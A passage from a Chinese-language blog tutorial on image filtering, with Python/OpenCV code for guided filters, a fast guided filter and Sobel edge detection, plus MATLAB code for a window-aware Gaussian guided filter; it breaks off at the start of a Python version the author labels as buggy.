函数功能：用于三通道图像（RGB彩色图）的引导滤波函数；</span></span><br><span class="line"><span class="comment"># 参数：srcImg：输入图像，为三通道图像；</span></span><br><span class="line"><span class="comment"># 参数：guideImg：引导图像，为三通道图像，尺寸与输入图像一致；</span></span><br><span class="line"><span class="comment"># 参数：rad：滤波器大小r，应该保证为奇数，默认值为9；</span></span><br><span class="line"><span class="comment"># 参数：eps：防止a过大的正则化参数ϵ，</span></span><br><span class="line"><span class="comment"># 返回：dstImg：输出图像，尺寸、通道数与输入图像吻合；</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_guidedFilter_threeChannel</span><span class="params">(srcImg, guidedImg, rad=<span class="number">9</span>, eps=<span class="number">0.01</span>)</span>:</span></span><br><span class="line">    </span><br><span class="line">    img_shape = np.shape(srcImg)</span><br><span class="line"></span><br><span class="line">    dstImg = np.zeros(img_shape, dtype=float)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> range(<span class="number">0</span>,img_shape[<span class="number">2</span>]):</span><br><span class="line">        dstImg[:,:,ind] = my_guidedFilter_oneChannel(srcImg[:,:,ind],</span><br><span class="line">              guidedImg[:,:,ind], rad, eps)</span><br><span class="line">    </span><br><span class="line">    dstImg = dstImg.astype(np.uint8)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dstImg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    img = cv2.imread(input_fn)<span class="comment">#读入图像</span></span><br><span class="line">    print( np.shape(img) )</span><br><span class="line"></span><br><span class="line">    dstimg = my_guidedFilter_threeChannel(img, img, <span class="number">9</span> , <span class="number">0.01</span>)<span class="comment">#输入图像作为自身的引导图</span></span><br><span class="line">    print( np.shape(dstimg) )</span><br><span class="line">    <span class="comment"># cv2.imwrite('output.jpg',dstimg)</span></span><br><span class="line">    cv2.imshow(<span class="string">'output'</span>, dstimg)</span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: Jin ZhangYu</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-contrib-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># 导入库</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> skimage</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造参数解析器</span></span><br><span class="line"><span class="comment"># ap = argparse.ArgumentParser()</span></span><br><span class="line"><span class="comment"># ap.add_argument("-H:\project_work\Machine_Vision_Lab\thesis\Gaussian\code", "--02.png", required=True, help = "Path to the image")</span></span><br><span class="line"><span class="comment"># args = vars(ap.parse_args())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载图像并显示</span></span><br><span class="line">input_fn = <span class="string">'02.png'</span></span><br><span class="line"><span class="comment"># img = cv2.imread(args["image"],1)</span></span><br><span class="line">img = cv2.imread(input_fn)</span><br><span class="line">img = img[:,:,::<span class="number">-1</span>]</span><br><span class="line">guide = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行导向滤波</span></span><br><span class="line">dst1 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">50</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line">dst2 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">200</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line">dst3 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">1000</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制图片</span></span><br><span class="line">images = [img,[dst1,dst2,dst3]]</span><br><span class="line">titles =    [</span><br><span class="line">                <span class="string">'Original'</span>,</span><br><span class="line">                [<span class="string">'Guided Filter eps=50'</span>,<span class="string">'Guided Filter eps=200'</span>,<span class="string">'Guided Filter eps=1000'</span>]</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制原图</span></span><br><span class="line">plt.figure(figsize=(<span class="number">9</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>),plt.imshow(images[<span class="number">0</span>])</span><br><span class="line">plt.title(titles[<span class="number">0</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">0</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">1</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">2</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">2</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line"><span class="comment"># plt.savefig('1_out.png', transparent=True, dpi=300, pad_inches = 0)</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h4 id="4-代码2-快速导向滤波"><a href="#4-代码2-快速导向滤波" class="headerlink" title="4. 代码2(快速导向滤波)"></a>4. 代码2(快速导向滤波)</h4><p>　　通过下采样减少像素点，计算mean_a &amp; mean_b后进行上采样恢复到原有的尺寸大小。假设缩放比例为s,那么缩小后像素点的个数为 <script type="math/tex">\frac {N}{s^2}</script> ，那么时间复杂度变为 <script type="math/tex">O(\frac {N}{s^2})</script> 。伪代码中：fmean代表均值平滑，fsubsample代表图像下采样即缩小图像，fupsample代表图片上采样即放大图像，s为缩小系数。参考：<a href="https://blog.csdn.net/wsp_1138886114/article/details/84228939?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></p><p><img alt="&#x56FE;2 FGF&#x7B97;&#x6CD5;&#x6846;&#x67B6;" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/FGF.png" class="lozad"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: SongpingWangSongpingWangs</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guideFilter</span><span class="params">(I, p, winSize, eps, s)</span>:</span></span><br><span class="line">    <span class="comment"># 输入图像的高、宽</span></span><br><span class="line">    h, w = I.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 缩小图像</span></span><br><span class="line">    size = (int(round(w * s)), int(round(h * s)))</span><br><span class="line">    small_I = cv2.resize(I, size, interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    small_p = cv2.resize(I, size, interpolation=cv2.INTER_CUBIC)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 缩小滑动窗口</span></span><br><span class="line">    X = winSize[<span class="number">0</span>]</span><br><span class="line">    small_winSize = (int(round(X * s)), int(round(X * s)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># I的均值平滑 p的均值平滑</span></span><br><span class="line">    mean_small_I = cv2.blur(small_I, small_winSize)</span><br><span class="line">    mean_small_p = cv2.blur(small_p, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># I*I和I*p的均值平滑</span></span><br><span class="line">    mean_small_II = cv2.blur(small_I * small_I, small_winSize)</span><br><span class="line">    mean_small_Ip = cv2.blur(small_I * small_p, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方差、协方差</span></span><br><span class="line">    var_small_I = mean_small_II - mean_small_I * mean_small_I</span><br><span class="line">    cov_small_Ip = mean_small_Ip - mean_small_I * mean_small_p</span><br><span class="line"></span><br><span class="line">    small_a = cov_small_Ip / (var_small_I + eps)</span><br><span class="line">    small_b = mean_small_p - small_a * mean_small_I</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对a、b进行均值平滑</span></span><br><span class="line">    mean_small_a = cv2.blur(small_a, small_winSize)</span><br><span class="line">    mean_small_b = cv2.blur(small_b, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 放大</span></span><br><span class="line">    size1 = (w, h)</span><br><span class="line">    mean_a = cv2.resize(mean_small_a, size1, interpolation=cv2.INTER_LINEAR)</span><br><span class="line">    mean_b = cv2.resize(mean_small_b, size1, interpolation=cv2.INTER_LINEAR)</span><br><span class="line"></span><br><span class="line">    q = mean_a * I + mean_b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    eps = <span class="number">0.01</span></span><br><span class="line">    winSize = (<span class="number">16</span>,<span class="number">16</span>)       <span class="comment">#类似卷积核（数字越大，磨皮效果越好）</span></span><br><span class="line">    image = cv2.imread(<span class="string">r'02.png'</span>, cv2.IMREAD_ANYCOLOR)</span><br><span class="line">    image = cv2.resize(image,<span class="literal">None</span>,fx=<span class="number">0.8</span>,fy=<span class="number">0.8</span>,interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    I = image/<span class="number">255.0</span>       <span class="comment">#将图像归一化</span></span><br><span class="line">    p =I</span><br><span class="line">    s = <span class="number">3</span> <span class="comment">#步长</span></span><br><span class="line">    guideFilter_img = guideFilter(I, p, winSize, eps,s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存导向滤波结果</span></span><br><span class="line">    guideFilter_img = guideFilter_img  * <span class="number">255</span>         <span class="comment">#(0,1)-&gt;(0,255)</span></span><br><span class="line">    guideFilter_img[guideFilter_img  &gt; <span class="number">255</span>] = <span class="number">255</span>    <span class="comment">#防止像素溢出</span></span><br><span class="line">    guideFilter_img = np.round(guideFilter_img )</span><br><span class="line">    guideFilter_img = guideFilter_img.astype(np.uint8)</span><br><span class="line">    cv2.imshow(<span class="string">"image"</span>,image)</span><br><span class="line">    cv2.imshow(<span class="string">"winSize_16"</span>, guideFilter_img )</span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="0x07-高通滤波-—-边缘检测-高反差保留"><a href="#0x07-高通滤波-—-边缘检测-高反差保留" class="headerlink" title="0x07 高通滤波 — 边缘检测/高反差保留"></a>0x07 高通滤波 — 边缘检测/高反差保留</h3><ol><li><strong>定义</strong>：</li><li><strong>代码</strong>：使用的函数有：<code>cv2.Sobel()</code> , <code>cv2.Schar()</code> , <code>cv2.Laplacian()</code> Sobel, scharr其实是求一阶或者二阶导数。scharr是对Sobel的优化。 Laplacian是求二阶导数。cv2.Sobel() 是一种带有方向过滤器。参考：<a href="https://blog.csdn.net/wsp_1138886114/article/details/82872838?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: SongpingWang</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">dst = cv2.Sobel(src, ddepth, dx, dy[, dst[, ksize[, scale[, delta[, borderType]]]]])</span></span><br><span class="line"><span class="string">src:    需要处理的图像；</span></span><br><span class="line"><span class="string">ddepth: 图像的深度，-1表示采用的是与原图像相同的深度。 </span></span><br><span class="line"><span class="string">        目标图像的深度必须大于等于原图像的深度；</span></span><br><span class="line"><span class="string">dx和dy: 求导的阶数，0表示这个方向上没有求导，一般为0、1、2。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dst     不用解释了；</span></span><br><span class="line"><span class="string">ksize： Sobel算子的大小，必须为1、3、5、7。  ksize=-1时，会用3x3的Scharr滤波器，</span></span><br><span class="line"><span class="string">        它的效果要比3x3的Sobel滤波器要好 </span></span><br><span class="line"><span class="string">scale： 是缩放导数的比例常数，默认没有伸缩系数；</span></span><br><span class="line"><span class="string">delta： 是一个可选的增量，将会加到最终的dst中， 默认情况下没有额外的值加到dst中</span></span><br><span class="line"><span class="string">borderType： 是判断图像边界的模式。这个参数默认值为cv2.BORDER_DEFAULT。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'02.png'</span>,cv2.IMREAD_COLOR)</span><br><span class="line">x=cv2.Sobel(img,cv2.CV_16S,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">y=cv2.Sobel(img,cv2.CV_16S,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">absx=cv2.convertScaleAbs(x)</span><br><span class="line">absy=cv2.convertScaleAbs(y)</span><br><span class="line">dist=cv2.addWeighted(absx,<span class="number">0.5</span>,absy,<span class="number">0.5</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">'original_img'</span>,img)</span><br><span class="line">cv2.imshow(<span class="string">'y'</span>,absy)</span><br><span class="line">cv2.imshow(<span class="string">'x'</span>,absx)</span><br><span class="line">cv2.imshow(<span class="string">'dsit'</span>,dist)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="0x08-窗口感知的高斯引导滤波"><a href="#0x08-窗口感知的高斯引导滤波" class="headerlink" title="0x08 窗口感知的高斯引导滤波"></a>0x08 窗口感知的高斯引导滤波</h3><ul><li><strong>gr.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function result = gr(px, py, qx, qy, dr)</span><br><span class="line">% 高斯空间核函数</span><br><span class="line">    result = exp( - ( (qx - px)^<span class="number">2</span> + (qy - py)^<span class="number">2</span> ) / (<span class="number">2</span> * dr^<span class="number">2</span>) );</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>gzeta.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function result = gzeta(guide_img, div, px, py, qx, qy, dzeta)</span><br><span class="line">% 高斯频域核函数</span><br><span class="line">    result = exp( - ( ( guide_img(px, py, div) - guide_img(qx, qy, div) )^<span class="number">2</span> )  / (<span class="number">2</span> * dzeta^<span class="number">2</span>) );</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>GS.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function output = GS(image, r, dr, px, py, div)</span><br><span class="line">% 求解高斯空间域滤波，返回指定像素点(p)的输出</span><br><span class="line">    Upsilon = <span class="number">0</span>;%τ，归一化系数</span><br><span class="line">    output = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i = -r : r % 以p为中心的窗口半径为<span class="number">2</span>r+<span class="number">1</span>的区域</span><br><span class="line">        <span class="keyword">for</span> j = -r : r</span><br><span class="line">            Upsilon = Upsilon + gr(px, py, px + i, py + j, dr);</span><br><span class="line">            output = output + gr(px, py, px + i, py + j, dr) * image(px + i,py + j,div);</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    output = output / Upsilon ;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>WGGF.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function output = WGGF(guide_img, source, r, dzeta, px, py, div, <span class="keyword">lambda</span>)</span><br><span class="line">% 窗口感知的高斯引导滤波</span><br><span class="line">%求解WGGF在每个像素点p的输出并返回</span><br><span class="line">    Upsilon = <span class="number">0</span>;%τ，归一化系数</span><br><span class="line">    output = <span class="number">0</span>;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i = -r : r</span><br><span class="line">        <span class="keyword">for</span> j = -r : r</span><br><span class="line">            temp = abs( guide_img(px + i, py + <span class="number">1</span>, div) - guide_img(px, py, div) );</span><br><span class="line">            <span class="keyword">if</span> temp &lt;= <span class="keyword">lambda</span> </span><br><span class="line">                flag = flag + <span class="number">1</span>;</span><br><span class="line">                Upsilon = Upsilon + gzeta(guide_img, div, px, py, px+i, py+j, dzeta);</span><br><span class="line">                output = output + guide_img(px + i,py + j,div) * gzeta(guide_img, div, px, py, px+i, py+j, dzeta);</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span> %不满足窗口感知的要求，返回<span class="number">3</span>*<span class="number">3</span>窗口中的像素点中值</span><br><span class="line">        output = medfilt2( source( (px - <span class="number">1</span>):(px + <span class="number">1</span>), (py - <span class="number">1</span>):(py + <span class="number">1</span>), j), [<span class="number">3</span>,<span class="number">3</span>] );</span><br><span class="line">    <span class="keyword">else</span> %满足条件</span><br><span class="line">        output = output / Upsilon ;</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>Main.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">%% 读取图片</span><br><span class="line">source = im2double( imread(<span class="string">'01.jpg'</span>) );</span><br><span class="line">guide_img = source;</span><br><span class="line"></span><br><span class="line">%% 求解高斯引导滤波</span><br><span class="line">[m ,n, div] = size(source);</span><br><span class="line">r = <span class="number">5</span>; %窗口半径</span><br><span class="line">dr = <span class="number">0.5</span>; %空域带宽</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span> : div</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> : m</span><br><span class="line">        <span class="keyword">for</span> j = <span class="number">1</span> : n</span><br><span class="line">            <span class="keyword">if</span> i &lt;= r || i &gt;= m - r || j &lt;= r || j &gt;= n - r %图片四周处理(原像素)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                guide_img(i,j,k) = GS(source, r, dr, i, j, k); %空间域滤波</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%% 求解WGGF</span><br><span class="line">target = guide_img;</span><br><span class="line">r = <span class="number">5</span>; %窗口半径</span><br><span class="line">dzeta = <span class="number">0.1</span>; %频域带宽</span><br><span class="line"><span class="keyword">lambda</span> = <span class="number">0.12</span>; % λ为一选定的阈值 </span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span> : div</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> : m</span><br><span class="line">        <span class="keyword">for</span> j = <span class="number">1</span> : n</span><br><span class="line">            <span class="keyword">if</span> i &lt;= r || i &gt;= m - r || j &lt;= r || j &gt;= n - r%图片四周处理(引导像素)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                target(i, j, k) = WGGF(guide_img, source, r, dzeta, i, j, k, <span class="keyword">lambda</span>); </span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%% 显示图形</span><br><span class="line">figure;</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>), imshow(source), title(<span class="string">'Source image'</span>);</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>), imshow(target), title(<span class="string">'WGGF image'</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>WGGF.py(Bug)</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 